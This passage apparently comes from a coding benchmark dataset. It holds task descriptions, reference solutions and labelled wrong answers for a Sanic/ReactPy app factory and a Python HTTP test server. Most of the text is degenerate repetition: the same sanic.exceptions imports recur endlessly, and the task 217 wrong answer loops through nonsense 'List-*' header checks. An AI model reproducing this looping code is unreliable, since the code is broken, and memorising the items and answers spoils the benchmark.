Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic.exceptions import UpgradeRequired\nfrom sanic.exceptions import PreconditionRequired\nfrom sanic.exceptions import TooManyRequests\nfrom sanic.exceptions import RequestHeaderFieldsTooLarge\nfrom sanic.exceptions import UnavailableForLegalReasons\nfrom sanic.exceptions import InternalServerError\nfrom sanic.exceptions import NotImplemented\nfrom sanic.exceptions import BadGateway\nfrom sanic.exceptions import ServiceUnavailable\nfrom sanic.exceptions import GatewayTimeout\nfrom sanic.exceptions import HTTPVersionNotSupported\nfrom sanic.exceptions import VariantAlsoNegotiates\nfrom sanic.exceptions import InsufficientStorage\nfrom sanic.exceptions import LoopDetected\nfrom sanic.exceptions import NotExtended\nfrom sanic.exceptions import NetworkAuthenticationRequired\nfrom sanic.exceptions import HTTPException\nfrom sanic.exceptions import SanicException\nfrom sanic.exceptions import RequestTimeout\nfrom sanic.exceptions import RequestEntityTooLarge\nfrom sanic.exceptions import BadRequest\nfrom sanic.exceptions import Unauthorized\nfrom sanic.exceptions import Forbidden\nfrom sanic.exceptions import MethodNotAllowed\nfrom sanic.exceptions import NotAcceptable\nfrom sanic.exceptions import Conflict\nfrom sanic.exceptions import Gone\nfrom sanic.exceptions import LengthRequired\nfrom sanic.exceptions import PreconditionFailed\nfrom sanic.exceptions import RequestedRangeNotSatisfiable\nfrom sanic.exceptions import ExpectationFailed\nfrom sanic.exceptions import ImATeapot\nfrom sanic.exceptions import MisdirectedRequest\nfrom sanic.exceptions import UnprocessableEntity\nfrom sanic.exceptions import Locked\nfrom sanic.exceptions import FailedDependency\nfrom sanic.exceptions import TooEarly\nfrom sanic"
  },
  {
    "Task_id": 215,
    "Instruction": "Task Description: Create a Sanic web application that serves as a backend for a ReactPy application, including a root route redirection and ReactPy configuration.\n\nFunction Description: The function `make_app` creates and configures a Sanic web application instance. It sets up a root route that redirects to a documentation page and configures the ReactPy backend with a specified URL prefix.\n\nInput:\n- name: str - The name to give the Sanic application instance\n\nOutput:\n- Sanic - Returns a configured Sanic application instance with:\n  - A root route (\"/\") that redirects to \"/docs/index.html\"\n  - ReactPy backend configured with the specified URL prefix (\"/_reactpy\")",
    "Canonical_solution": "from sanic import Sanic, response\nfrom reactpy.backend.sanic import Options, configure\n\nREACTPY_MODEL_SERVER_URL_PREFIX = \"/_reactpy\"\n\ndef make_app(name: str):\n    app = Sanic(name)\n\n    @app.route(\"/\")\n    async def forward_to_index(_):\n        return response.redirect(\"/docs/index.html\")\n\n    configure(\n        app,\n        Example,\n        Options(url_prefix=REACTPY_MODEL_SERVER_URL_PREFIX),\n    )\n\n    return app",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nfrom sanic import Sanic\nfrom sanic.response import redirect\n\ndef make_app(name: str) -> Sanic:\n    app = Sanic(name)\n    app.config.REACTPY_URL_PREFIX = \"/_reactpy\"\n    app.add_route(redirect(\"/docs/index.html\"), \"/\")\n    return app\n```"
  },
  {
    "Task_id": 217,
    "Instruction": "Task Description: Create a Python HTTP server for testing purposes that can handle GET and POST requests, serve static and dynamic files, and support features like range requests and gzip compression.\n\nClass Description: HTTPTestHandler is a custom request handler class that extends BaseHTTPRequestHandler to implement specific HTTP request handling logic for testing scenarios.\n\nAttributes:\n- static_files: dict - A dictionary mapping file paths to their static content (bytes)\n- dynamic_files: dict - A dictionary for storing dynamically created file content (bytes)\n- files: ChainMap - A combined view of both static_files and dynamic_files dictionaries\n\nMethods:\n- _respond(code=200, headers=None, data=b\"\"): None - Helper method to send HTTP responses\n  Input:\n    - code: int - HTTP status code (default: 200)\n    - headers: dict - Response headers (default: None)\n    - data: bytes - Response body (default: empty bytes)\n  Output: None (sends response directly to client)\n\n- do_GET(): None - Handles HTTP GET requests\n  Input: None (uses self.path and self.headers from the request)\n  Output: None (sends response directly to client)\n\n- do_POST(): None - Handles HTTP POST requests\n  Input: None (uses self.path, self.headers, and request body)\n  Output: None (sends response directly to client)\n\n- read_chunks(): generator - Helper method to read chunked transfer encoding\n  Input: None\n  Output: generator yielding bytes - The chunks of data from the request body\n\nContext Manager:\n- serve(): contextmanager - Creates and manages an HTTP server in a separate thread\n  Input: None\n  Output: generator yielding str - The server URL (e.g., \"http://localhost:12345\")\n  Note: Automatically cleans up server resources when context exits",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport threading\nimport contextlib\nimport json\nimport gzip\nfrom collections import ChainMap\n\nclass HTTPTestHandler(BaseHTTPRequestHandler):\n    static_files = {\n        \"/index/realfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/index/otherfile\": b\"\\n\".join([b\"some test data\"] * 1000),\n        \"/data/20020401\": b'<a href=\"http://testserver/index/realfile\">Link</a>',\n    }\n    dynamic_files = {}\n    files = ChainMap(dynamic_files, static_files)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        headers = headers or {}\n        headers.update({\"User-Agent\": \"test\"})\n        self.send_response(code)\n        for k, v in headers.items():\n            self.send_header(k, str(v))\n        self.end_headers()\n        if data:\n            self.wfile.write(data)\n\n    def do_GET(self):\n        file_path = self.path\n        if file_path.endswith(\"/\") and file_path.rstrip(\"/\") in self.files:\n            file_path = file_path.rstrip(\"/\")\n        file_data = self.files.get(file_path)\n        \n        if \"give_path\" in self.headers:\n            return self._respond(200, data=json.dumps({\"path\": self.path}).encode())\n        if file_data is None:\n            return self._respond(404)\n\n        status = 200\n        if \"Range\" in self.headers and \"ignore_range\" not in self.headers:\n            ran = self.headers[\"Range\"]\n            b, ran = ran.split(\"=\")\n            start, end = ran.split(\"-\")\n            if start:\n                file_data = file_data[int(start) : (int(end) + 1) if end else None]\n            else:\n                l = len(file_data)\n                file_data = file_data[-int(end) :]\n            if \"use_206\" in self.headers:\n                status = 206\n\n        if \"give_length\" in self.headers:\n            if \"gzip_encoding\" in self.headers:\n                file_data = gzip.compress(file_data)\n                response_headers = {\n                    \"Content-Length\": len(file_data),\n                    \"Content-Encoding\": \"gzip\",\n                }\n            else:\n                response_headers = {\"Content-Length\": len(file_data)}\n            self._respond(status, response_headers, file_data)\n        else:\n            self._respond(status, data=file_data)\n\n    def do_POST(self):\n        length = self.headers.get(\"Content-Length\")\n        file_path = self.path.rstrip(\"/\")\n        if length is None:\n            assert self.headers.get(\"Transfer-Encoding\") == \"chunked\"\n            self.files[file_path] = b\"\".join(self.read_chunks())\n        else:\n            self.files[file_path] = self.rfile.read(int(length))\n        self._respond(200)\n\n    def read_chunks(self):\n        length = -1\n        while length != 0:\n            line = self.rfile.readline().strip()\n            if len(line) == 0:\n                length = 0\n            else:\n                length = int(line, 16)\n            yield self.rfile.read(length)\n            self.rfile.readline()\n\n@contextlib.contextmanager\ndef serve():\n    server_address = (\"\", 0)\n    httpd = HTTPServer(server_address, HTTPTestHandler)\n    th = threading.Thread(target=httpd.serve_forever)\n    th.daemon = True\n    th.start()\n    try:\n        yield f\"http://{httpd.server_name}:{httpd.server_port}\"\n    finally:\n        httpd.socket.close()\n        httpd.shutdown()\n        th.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom threading import Thread\nfrom contextlib import contextmanager\nfrom collections import ChainMap\nimport gzip\nimport io\n\nclass HTTPTestHandler(BaseHTTPRequestHandler):\n    def __init__(self, *args, **kwargs):\n        self.static_files = {}\n        self.dynamic_files = {}\n        self.files = ChainMap(self.static_files, self.dynamic_files)\n        super().__init__(*args, **kwargs)\n\n    def _respond(self, code=200, headers=None, data=b\"\"):\n        if headers is None:\n            headers = {}\n        self.send_response(code)\n        for key, value in headers.items():\n            self.send_header(key, value)\n        self.end_headers()\n        self.wfile.write(data)\n\n    def do_GET(self):\n        path = self.path.strip(\"/\")\n        if path in self.files:\n            content = self.files[path]\n            if isinstance(content, str):\n                content = content.encode()\n            self._respond(data=content)\n        else:\n            self._respond(code=404)\n\n    def do_POST(self):\n        path = self.path.strip(\"/\")\n        content_length = int(self.headers.get('Content-Length', 0))\n        body = self.rfile.read(content_length)\n        self.dynamic_files[path] = body\n        self._respond()\n\n    def read_chunks(self):\n        boundary = self.headers.get(\"Content-Type\", \"\").split(\"boundary=\")[-1]\n        while True:\n            line = self.rfile.readline()\n            if not line:\n                break\n            line = line.decode()\n            if line == f\"--{boundary}\\r\\n\":\n                chunk = b\"\"\n                while True:\n                    line = self.rfile.readline()\n                    if not line:\n                        break\n                    line = line.decode()\n                    if line == f\"--{boundary}--\\r\\n\":\n                        break\n                    if line == f\"--{boundary}--\":\n                        break\n                    if line.startswith(\"Content-Type:\"):\n                        continue\n                    if line.startswith(\"Content-Disposition:\"):\n                        continue\n                    if line.startswith(\"Content-Length:\"):\n                        continue\n                    if line.startswith(\"Transfer-Encoding:\"):\n                        continue\n                    if line.startswith(\"Content-Transfer-Encoding:\"):\n                        continue\n                    if line.startswith(\"Content-ID:\"):\n                        continue\n                    if line.startswith(\"MIME-Version:\"):\n                        continue\n                    if line.startswith(\"X-\"):\n                        continue\n                    if line.startswith(\"Date:\"):\n                        continue\n                    if line.startswith(\"User-Agent:\"):\n                        continue\n                    if line.startswith(\"From:\"):\n                        continue\n                    if line.startswith(\"To:\"):\n                        continue\n                    if line.startswith(\"Subject:\"):\n                        continue\n                    if line.startswith(\"Message-ID:\"):\n                        continue\n                    if line.startswith(\"In-Reply-To:\"):\n                        continue\n                    if line.startswith(\"References:\"):\n                        continue\n                    if line.startswith(\"List-Id:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Archive:\"):\n                        continue\n                    if line.startswith(\"List-Post:\"):\n                        continue\n                    if line.startswith(\"List-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Help:\"):\n                        continue\n                    if line.startswith(\"List-Info:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Digest:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Digest:\"):\n                        continue\n                    if line.startswith(\"List-Post-Digest:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Digest:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Digest:\"):\n                        continue\n                    if line.startswith(\"List-Help-Digest:\"):\n                        continue\n                    if line.startswith(\"List-Info-Digest:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Post-Post:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Post:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Post:\"):\n                        continue\n                    if line.startswith(\"List-Help-Post:\"):\n                        continue\n                    if line.startswith(\"List-Info-Post:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Post-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Help-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Info-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Post-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Help-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Info-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Post-Help:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Help:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Help:\"):\n                        continue\n                    if line.startswith(\"List-Help-Help:\"):\n                        continue\n                    if line.startswith(\"List-Info-Help:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Post-Info:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Info:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Info:\"):\n                        continue\n                    if line.startswith(\"List-Help-Info:\"):\n                        continue\n                    if line.startswith(\"List-Info-Info:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Post-Post:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Post:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Post:\"):\n                        continue\n                    if line.startswith(\"List-Help-Post:\"):\n                        continue\n                    if line.startswith(\"List-Info-Post:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Post-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Help-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Info-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Post-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Help-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Info-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Post-Help:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Help:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Help:\"):\n                        continue\n                    if line.startswith(\"List-Help-Help:\"):\n                        continue\n                    if line.startswith(\"List-Info-Help:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Post-Info:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Info:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Info:\"):\n                        continue\n                    if line.startswith(\"List-Help-Info:\"):\n                        continue\n                    if line.startswith(\"List-Info-Info:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Post-Post:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Post:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Post:\"):\n                        continue\n                    if line.startswith(\"List-Help-Post:\"):\n                        continue\n                    if line.startswith(\"List-Info-Post:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Post-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Help-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Info-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Post-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Help-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Info-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Help:\"):\n                        continue\n                    if line.startswith(\"List-Post-Help:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Help:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Help:\"):\n                        continue\n                    if line.startswith(\"List-Help-Help:\"):\n                        continue\n                    if line.startswith(\"List-Info-Help:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Info:\"):\n                        continue\n                    if line.startswith(\"List-Post-Info:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Info:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Info:\"):\n                        continue\n                    if line.startswith(\"List-Help-Info:\"):\n                        continue\n                    if line.startswith(\"List-Info-Info:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Subscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Post-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Help-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Info-Unsubscribe:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Post:\"):\n                        continue\n                    if line.startswith(\"List-Post-Post:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Post:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Post:\"):\n                        continue\n                    if line.startswith(\"List-Help-Post:\"):\n                        continue\n                    if line.startswith(\"List-Info-Post:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Post-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Help-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Info-Owner:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Unsubscribe-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Post-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Owner-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Manager-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Help-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Info-Manager:\"):\n                        continue\n                    if line.startswith(\"List-Subscribe-Help:\"):\n                        continue\n                    if 